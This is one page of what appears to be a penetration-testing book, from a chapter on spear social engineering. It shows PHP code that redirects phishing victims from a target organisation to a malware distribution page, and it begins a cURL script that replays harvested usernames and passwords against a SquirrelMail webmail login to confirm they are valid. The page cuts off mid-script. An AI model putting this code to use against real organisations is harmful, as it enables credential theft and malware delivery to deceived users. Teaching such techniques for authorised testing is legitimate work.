<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pfd2" class="pf w2 h2" data-page-no="d2"><div class="pc pcd2 w2 h2"><div class="t m0 x6 h10 y83 ff2 fs2 fc0 sc0 ls8 ws0">Chapter 6: Spear Social Engineering<span class="_ _9"> </span><span class="ff1 fs9 lsa">187</span></div><div class="t m0 x4 hd y11c ff4 fs7 fc0 sc0 ls0 ws0">Y<span class="_ _1b"/>ou can use this redirect method to send the user to a page on your phishing </div><div class="t m0 x3 hd y11d ff4 fs7 fc0 sc0 ls0 ws0">website or to an external website. <span class="_ _0"/>W<span class="_ _3"/>e can also combine some logic to determine </div><div class="t m0 x3 hd y11e ff4 fs7 fc0 sc0 ls0 ws0">where we want to send the user<span class="_ _2"/>. The follo<span class="_ _0"/>wing pseudo-code sends the user to our </div><div class="t m0 x3 hd y15c ff4 fs7 fc0 sc0 ls0 ws0">malware distrib<span class="_ _0"/>ution page if their source IP address is the same as an IP address </div><div class="t m0 x3 hd y15d ff4 fs7 fc0 sc0 lsb ws16">associated with the target or<span class="_ _0"/>ganization. If the IP address is unkno<span class="_ _0"/>wn, then we can </div><div class="t m0 x3 hd y271 ff4 fs7 fc0 sc0 ls0 ws0">send them to the failed login page.</div><div class="t m0 x3 h40 y13cf fff fs5 fc0 sc0 ls0 ws0">if ( $sourceIP == $knownIP )</div><div class="t m0 x3 h40 y13d0 fff fs5 fc0 sc0 ls0 ws0">      header( 'Location: http://portal-weaktarget.com/malware.htm' ) ;</div><div class="t m0 x3 h40 y13d1 fff fs5 fc0 sc0 ls0 ws0">else</div><div class="t m0 x3 h40 y13d2 fff fs5 fc0 sc0 ls0 ws0">      header( 'Location: http://portal-weaktarget.com/failed-login.htm' ) ;</div><div class="t m0 x4 hd y13d3 ff4 fs7 fc0 sc0 ls0 ws0">If we don’t w<span class="_ _0"/>ant to simply accept or reject the user’<span class="_ _2"/>s credentials, we can test the </div><div class="t m0 x3 hd y13d4 ff4 fs7 fc0 sc0 ls0 ws0">credentials on a legitimate website. In this case, you don’<span class="_ _0"/>t necessarily hav<span class="_ _0"/>e to test the </div><div class="t m0 x3 hd y13d5 ff4 fs7 fc0 sc0 ls0 ws0">credentials on a website that you’<span class="_ _2"/>ve copied, although that would almost guarantee </div><div class="t m0 x3 hd y13d6 ff4 fs7 fc0 sc0 ls0 ws0">that you could trust the response from the system as to whether the credentials are </div><div class="t m0 x3 hd y13d7 ff4 fs7 fc0 sc0 ls0 ws0">v<span class="_ _0"/>alid or not. Instead, you could test the credentials on an arbitrary system associated </div><div class="t m0 x3 hd y13d8 ff4 fs7 fc0 sc0 ls0 ws0">with the target. <span class="_ _1b"/>Y<span class="_ _3"/>ou might need to either directly or indirectly instruct the user to use </div><div class="t m0 x3 hd y13d9 ff4 fs7 fc0 sc0 ls0 ws0">the credentials associated with this other system. For e<span class="_ _0"/>xample, if you instruct the </div><div class="t m0 x3 hd y13da ff4 fs7 fc0 sc0 ls0 ws0">user to log in to the ne<span class="_ _0"/>w website with their existing domain credentials, you might be </div><div class="t m0 x3 hd y13db ff4 fs7 fc0 sc0 ls0 ws0">able to attempt to log in to an identied web mail or virtual pri<span class="_ _0"/>vate netw<span class="_ _0"/>ork (VPN) </div><div class="t m0 x3 hd y13dc ff4 fs7 fc0 sc0 ls0 ws0">system.</div><div class="t m0 x4 hd y13dd ff4 fs7 fc0 sc0 ls0 ws0">In the follo<span class="_ _0"/>wing example, the user name and password the user submits to our </div><div class="t m0 x3 hd yf98 ff4 fs7 fc0 sc0 lsb ws16">phishing website ($user and $pass) are being submitted by our web server against </div><div class="t m0 x3 hd y13de ff4 fs7 fc0 sc0 ls0 ws0">a target web mail system that has a web login form. In this e<span class="_ _0"/>xample, the target web </div><div class="t m0 x3 hd y13df ff4 fs7 fc0 sc0 ls0 ws0">mail system is a SquirrelMail system, which is actually a popular web interface </div><div class="t m0 x3 hd y13e0 ff4 fs7 fc0 sc0 ls0 ws0">for e-mail. The form element names (login_username and secretk<span class="_ _0"/>ey) will work </div><div class="t m0 x3 hd y13e1 ff4 fs7 fc0 sc0 ls0 ws0">for SquirrelMail, but you’<span class="_ _0"/>ll hav<span class="_ _0"/>e to obtain the form element names for whate<span class="_ _0"/>ver </div><div class="t m0 x3 hd y13e2 ff4 fs7 fc0 sc0 ls0 ws0">form the target system is using, as the<span class="_ _0"/>y will almost certainly be dif<span class="_ _0"/>ferent. In the </div><div class="t m0 x3 hd y13e3 ff4 fs7 fc0 sc0 ls0 ws0">follo<span class="_ _0"/>wing example, we’<span class="_ _2"/>re submitting the credentials and then checking for the string </div><div class="t m0 x3 h3f y13e4 ff4 fs7 fc0 sc0 ls0 ws0">“<span class="fff">Unknown<span class="_ _5b"> </span>user<span class="_ _7b"> </span>or<span class="_ _7b"> </span>password<span class="_ _5b"> </span>incorrect</span>,<span class="_ _2"/>” which is obviously indicati<span class="_ _0"/>ve of </div><div class="t m0 x3 hd y13e5 ff4 fs7 fc0 sc0 ls0 ws0">in<span class="_ _0"/>v<span class="_ _0"/>alid credentials. <span class="_ _0"/>W<span class="_ _3"/>e obtained this string by submitting inv<span class="_ _0"/>alid credentials on the </div><div class="t m0 x3 hd y13e6 ff4 fs7 fc0 sc0 ls0 ws0">web mail form. So in this case, if we don’t see this string in the response from the </div><div class="t m0 x3 hd y13e7 ff4 fs7 fc0 sc0 ls0 ws0">web mail system, we can assume that the credentials are v<span class="_ _0"/>alid.</div><div class="t m0 x3 h44 y13e8 fff fse fc0 sc0 ls0 ws0">&lt;?php</div><div class="t m0 x3 h44 y13e9 fff fse fc0 sc0 ls0 ws0">$user = $_POST['user'];</div><div class="t m0 x3 h44 y13ea fff fse fc0 sc0 ls0 ws0">$pass = $_POST['pass'];</div><div class="t m0 x3 h44 y13eb fff fse fc0 sc0 ls0 ws0">$ch = curl_init();</div><div class="t m0 x3 h44 y13ec fff fse fc0 sc0 ls0 ws0">$url = "http://webmail.weaktarget.com/src/redirect.php";</div><div class="t m0 x3 h44 y13ed fff fse fc0 sc0 ls0 ws0">$post_fields = "login_username=$user&amp;secretkey=$pass";</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>